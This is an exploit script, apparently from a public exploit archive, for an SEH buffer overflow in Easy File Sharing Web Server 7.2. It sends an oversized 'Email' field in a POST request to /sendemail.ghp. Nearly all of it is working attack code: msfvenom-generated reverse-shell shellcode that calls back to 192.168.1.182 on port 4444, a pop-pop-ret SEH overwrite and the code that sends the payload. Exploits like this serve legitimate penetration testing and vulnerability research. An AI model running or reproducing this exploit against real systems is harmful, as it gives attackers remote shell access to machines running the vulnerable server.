# Exploit Title: Easy File Sharing Web Server 7.2 'POST' (SEH)
# Vendor Homepage: http://www.sharing-file.com/
# Software Link: http://www.sharing-file.com/efssetup.exe
# Exploit author: Felipe Winsnes
# Version: 7.2
# Tested on: Windows 7 x86

#!/usr/bin/python

import httplib
import sys
import struct

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.182 LPORT=4444 -f py -b "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e" EXITFUNC=seh
buf =  ""
buf += "\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x4b\xf4\xb4\xbd\x83\xee\xfc\xe2\xf4\xb7\x1c"
buf += "\x36\xbd\x4b\xf4\xd4\x34\xae\xc5\x74\xd9\xc0\xa4\x84"
buf += "\x36\x19\xf8\x3f\xef\x5f\x7f\xc6\x95\x44\x43\xfe\x9b"
buf += "\x7a\x0b\x18\x81\x2a\x88\xb6\x91\x6b\x35\x7b\xb0\x4a"
buf += "\x33\x56\x4f\x19\xa3\x3f\xef\x5b\x7f\xfe\x81\xc0\xb8"
buf += "\xa5\xc5\xa8\xbc\xb5\x6c\x1a\x7f\xed\x9d\x4a\x27\x3f"
buf += "\xf4\x53\x17\x8e\xf4\xc0\xc0\x3f\xbc\x9d\xc5\x4b\x11"
buf += "\x8a\x3b\xb9\xbc\x8c\xcc\x54\xc8\xbd\xf7\xc9\x45\x70"
buf += "\x89\x90\xc8\xaf\xac\x3f\xe5\x6f\xf5\x67\xdb\xc0\xf8"
buf += "\xff\x36\x13\xe8\xb5\x6e\xc0\xf0\x3f\xbc\x9b\x7d\xf0"
buf += "\x99\x6f\xaf\xef\xdc\x12\xae\xe5\x42\xab\xab\xeb\xe7"
buf += "\xc0\xe6\x5f\x30\x16\x9c\x87\x8f\x4b\xf4\xdc\xca\x38"
buf += "\xc6\xeb\xe9\x23\xb8\xc3\x9b\x4c\x0b\x61\x05\xdb\xf5"
buf += "\xb4\xbd\x62\x30\xe0\xed\x23\xdd\x34\xd6\x4b\x0b\x61"
buf += "\xed\x1b\xa4\xe4\xfd\x1b\xb4\xe4\xd5\xa1\xfb\x6b\x5d"
buf += "\xb4\x21\x23\xd7\x4e\x9c\x74\x15\x4a\x42\xdc\xbf\x4b"
buf += "\xe5\xe8\x34\xad\x9e\xa4\xeb\x1c\x9c\x2d\x18\x3f\x95"
buf += "\x4b\x68\xce\x34\xc0\xb1\xb4\xba\xbc\xc8\xa7\x9c\x44"
buf += "\x08\xe9\xa2\x4b\x68\x23\x97\xd9\xd9\x4b\x7d\x57\xea"
buf += "\x1c\xa3\x85\x4b\x21\xe6\xed\xeb\xa9\x09\xd2\x7a\x0f"
buf += "\xd0\x88\xbc\x4a\x79\xf0\x99\x5b\x32\xb4\xf9\x1f\xa4"
buf += "\xe2\xeb\x1d\xb2\xe2\xf3\x1d\xa2\xe7\xeb\x23\x8d\x78"
buf += "\x82\xcd\x0b\x61\x34\xab\xba\xe2\xfb\xb4\xc4\xdc\xb5"
buf += "\xcc\xe9\xd4\x42\x9e\x4f\x4a\xb3\x79\x1e\xdc\x1b\xde"
buf += "\x49\x29\x42\x9e\xc8\xb2\xc1\x41\x74\x4f\x5d\x3e\xf1"
buf += "\x0f\xfa\x58\x86\xdb\xd7\x4b\xa7\x4b\x68"

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

seh = struct.pack("<I", 0x100161e5) # pop esi # pop edi # ret
nseh = struct.pack("<I", 0x909006EB)
host = sys.argv[1]
buffer = "A" * 4060 + nseh + seh + buf + "\xcc" * 3000

print bcolors.OKGREEN + "[+]" + bcolors.ENDC + " Sending payload!"

httpServ = httplib.HTTPConnection(sys.argv[1], 80)
httpServ.connect()

httpServ.request('POST', '/sendemail.ghp',
'Email=%s&getPassword=Get+Password' %buffer)

response = httpServ.getresponse()

httpServ.close()
